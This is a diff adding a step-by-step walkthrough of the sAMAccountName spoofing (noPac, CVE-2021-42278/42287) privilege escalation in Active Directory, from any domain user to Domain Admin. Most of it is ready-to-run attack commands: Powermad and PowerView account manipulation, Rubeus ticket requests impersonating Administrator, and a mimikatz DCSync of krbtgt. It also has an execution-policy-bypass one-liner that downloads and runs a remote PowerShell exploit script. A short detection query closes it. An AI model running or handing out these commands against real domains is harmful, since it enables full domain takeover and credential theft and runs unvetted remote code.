@@ -1,0 +1,128 @@
+sAMAccountName Spoofing .... a journey from being any domain user to Domain Admin!
+
+Scenario: The attacker has gained foothold on a workstation. The domain is using the default configuration and the logged on user therefore has the flowing permissions:
+
+1. SeMachineAccountPrivilege
+2. MS-DS-Machine-Account-Quota
+
+The first one translates to “Add workstations to domain” but can only be abused if the MS-DS-Machine-Account-Quota parameter is not set to 0. In this case any user can create up 10 (default) computer objects in Active Directory.
+
+Tip!Run this PS query in powershell:
+
+Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'
+
+Phase 1: CVE-2021-42278 – sAMAccountName spoofing
+Theory: To distinguish user accounts from computer accounts, Active Directory appends a trailing $ in its sAMAccountName attribute but no validation process existed to make sure of it.
+
+Phase2: CVE-2021-42287 - KDC bamboozling
+Theory: Prior of requesting a service ticket a ticket granting ticket (TGT) needs to be issued first. When a service ticket is requested for an account that doesn’t exist in the Key Distribution Center (KDC) the Key Distribution Center will follow up with a search appending the $ sign on that account.
+
+Practice:
+
+1. Create a machine account(ControlledComputer): To begin, use Powermad's New-MachineAccount tool to construct a new computer, as shown below:
+
+# 1. create a computer account
+
+import-module .\Powermad.psm1
+$password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
+New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "stark.local" -DomainController "DC.stark.local" -Verbose
+ 
+
+2. The ability to edit a machine account's sAMAccountName and servicePrincipalName attributes is a requirement to the attack chain. The easiest way this can be achieved is by creating a computer account (e.g. by leveraging the MachineAccountQuota domain-level attribute if it's greater than 0) as shown in step 1. The creator of the new machine account has enough privileges to edit all its attributes. 
+Using the PowerView module's set-DomainObject command, clear the service principal name of that computer.
+
+# 2. clear its SPNs
+
+import-module .\PowerSploit.psm1
+Set-DomainObject -Identity 'ControlledComputer$' -Clear 'serviceprincipalname' -Verbose
+
+3. Because you have the "creator owner" access in Active Directory for that object, you can change the sAMAccountName attribute's property. Run the command below to modify that attribute to be the same as that of the domain controller name (without the $).Active Directory does not check for this behavior and let her change the name. This is CVE-2021-42278.
+
+# 3. rename the computer (computer -> DC)
+
+import-module .\Powermad.psm1
+Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DC" -Attribute samaccountname -Verbose
+
+4.Rubeus now requests a TGT token with the faked sAMAccountName as the username and password provided during the computer object creation process. Kerberos validates the request and provides a TGT token that can be used later. 
+
+# 4. obtain a TGT
+
+Rubeus.exe asktgt /user:"DC" /password:"ComputerPassword" /domain:"stark.local" /dc:"DC.stark.local" /nowrap
+
+5. Restore the “sAMAccountName” attribute to its original value or any other value
+
+# 5. reset the computer name to original value
+
+import-module .\Powermad.psm1
+Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
+
+6. Since the TGT is already stored in memory the service ticket can be requested on behalf of the domain admin using “S4U2self” kerberos extension. Since the original ticket belongs to the dc user which now doesn’t exist as the sam account name has been renamed, Kerberos will look for the dc$ which is a valid machine account and will issue the ticket for the requested service.
+
+# 6. obtain a service ticket with S4U2self by presenting the previous TGT
+
+Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"ldap/DC.stark.local" /dc:"DC.stark.local" /ptt /ticket:[Base64 TGT]
+
+[Base64 TGT] --> copy from Step 4
+
+7. check the kerberos service ticket:
+
+klist
+
+ 
+8. Do a DCSync using mimikatz
+# 7. DCSync
+(mimikatz) lsadump::dcsync /domain:stark.local /kdc:DC.stark.local /user:krbtgt
+
+
+More VISUALLY APEALING:(just replace ldap/DC.stark.local with cifs/DC.stark.local on step 6 command )
+
+***To demonstrate that the attacker now has access to domain controller, I added an additional TGS for cifs/DC and could access the system root over network.
+
+Rubeus.exe" s4u /self /impersonateuser:"Administrator" /altservice:"cifs/DC01.cve.lab" /dc:"DC01.cve.lab" /ptt /ticket:[Base64 TGT]
+
+[Base64 TGT] --> copy from Step 4
+
+then use:
+
+dir \\dc.domain.com\c$
+
+@@@@@@@
+
+automated script on my github:
+
+https://github.com/IAMinZoho/sAMAccountName-Spoofing
+
+
+@@@@@@@@@@@@@
+
+ANOTHER AUTOMATION:
+
+https://gist.github.com/S3cur3Th1sSh1t/0ed2fb0b5ae485b68cbc50e89581baa6
+
+IEX:
+Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/IAMinZoho/sAMAccountName-Spoofing/blob/main/Invoke-noPac.ps1'))
+
+
+Read about invoke-nopac from:
+https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/
+
+Run in unelevated powershell:
+
+Invoke-noPac -command "-domain mitnick.in -user Bob -pass user@123 /dc mndc.mitnick.in /mAccount ControlledComputer /mPassword Password123 /service cifs /ptt"
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@
+
+Detection:
+
+To find any computer accounts that have a invalid SamAccountName property use this query.
+
+Get-ADComputer -Filter { samAccountName -notlike "*$" }
+
+
+@@@@@@
+event based checking:
+
+https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45
+
+
